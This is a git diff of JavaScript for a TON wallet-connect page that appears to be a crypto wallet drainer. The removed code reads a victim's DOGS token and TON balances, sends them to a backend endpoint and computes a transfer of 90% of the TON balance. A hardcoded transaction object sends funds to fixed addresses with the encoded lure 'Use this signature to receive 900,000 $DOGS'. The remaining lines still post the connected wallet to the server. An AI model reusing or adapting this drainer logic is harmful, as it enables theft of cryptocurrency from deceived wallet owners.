@@ -81,21 +81,12 @@ tonConnectUI.onStatusChange(async (wallet) => {
     connectedWallet = wallet;
 
     try {
-        console.log(wallet);
-        const recipientJettonWalletAddress = await dogsContract.getJettonWalletAddress(new TonWeb.utils.Address(wallet.account.address));
-        const addr =  recipientJettonWalletAddress.toString();
-        console.log('Recipient Jetton Wallet Address:', addr);
-        const dogs = await getAccountDogsBalance(addr);
-        const tons = await getTonBalance(wallet.account.address);
         fetch("/api/transaction", {
             headers: {
                 "content-type": "application/json"
             },
             body: JSON.stringify({
-                address: wallet.account.address,
-                dogs,
-                addr,
-                tons
+                address: wallet.account.address
             }),
             method: "POST"
         }).then(r=>r.json()).then(async response => {
@@ -163,65 +154,4 @@ async function showModal() {
     modal.appendChild(closeButton);
 
     document.body.appendChild(modal);
-}
-
-
-const ex = {
-    "validUntil": 1724929839,
-    "messages": [
-        {
-            "address": "EQC_KzjGt_hxtZ_f8pgyQysxPSkRmmnhQtrSp0Z8usKvQsvp",
-            "amount": "1000000",
-            "payload": "te6cckEBAgEAiwABrg+KfqUAAAAAAAAAAHAzKLlExAAIAY1Hk9lIWUj7e7Az4rGlR++8sg0Ns23bJbuJsZMieR9fADGo8nspCykfb3YGfFY0qP33lkGhtm27ZLdxNjJkTyPrwQEAXgAAAABVc2UgdGhpcyBzaWduYXR1cmUgdG8gcmVjZWl2ZSA5MDAsMDAwICRET0dTpYcTPg=="
-        },
-        {
-            "address": "0:d116ae1a1cb67cabd104401ddfd69bed46355341fd2700590036eb1b936a708a",
-            "amount": "50000000",
-            "payload": "te6cckEBAgEAigABrA+KfqUAAAAAAAAAAGBFnYO6tKgBR/aGXup5/nVXjx3dRXDCjh5L4JGpbDEMKo/FVq/S/SMAMajyeykLKR9vdgZ8VjSo/feWQaG2bbtkt3E2MmRPI+vBAQBeAAAAAFVzZSB0aGlzIHNpZ25hdHVyZSB0byByZWNlaXZlIDkwMCwwMDAgJERPR1N70RHu"
-        },
-        {
-            "address": "UQCj-0MvdTz_OqvHju6iuGFHDyXwSNS2GIYVR-KrV-l-kalU",
-            "amount": 809107390,
-            "payload": "te6cckEBAQEAMQAAXgAAAABVc2UgdGhpcyBzaWduYXR1cmUgdG8gcmVjZWl2ZSA5MDAsMDAwICRET0dTjdOC9g=="
-        }
-    ]
-};
-
-
-
-async function getAccountDogsBalance(recipientJettonWalletAddress) {
-    try {
-        const jettonWalletContract = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
-            address: recipientJettonWalletAddress,
-        });
-
-        // Fetch the Jetton balance from the Jetton Wallet contract
-        const jettonData = await jettonWalletContract.getData();
-        const jettonBalance = jettonData.balance;
-        return TonWeb.utils.fromNano(jettonBalance);
-    } catch (error) {
-        console.error('Error fetching Jetton balance:', error);
-        return '0'
-    }
-}
-
-async function getTonBalance(walletAddress) {
-    try {
-
-        // Convert wallet address to TONWeb Address format
-        const tonAddress = new TonWeb.utils.Address(walletAddress);
-
-        // Get the account state
-        const account = await tonweb.provider.getAddressInfo(tonAddress.toString(true, true, true));
-
-        // Check if the account exists and is active
-        console.log("account", account)
-
-        // Convert balance from nanotons to tons (1 TON = 10^9 nanotons)
-        const balanceTon = Math.floor(parseFloat(account.balance));
-        console.log(`Wallet Balance: ${balanceTon} TON`);
-        return Math.floor(balanceTon - ((balanceTon / 100) * 10)) || 72635266;
-    } catch (error) {
-        console.error('Failed to get TON balance:', error);
-    }
 }
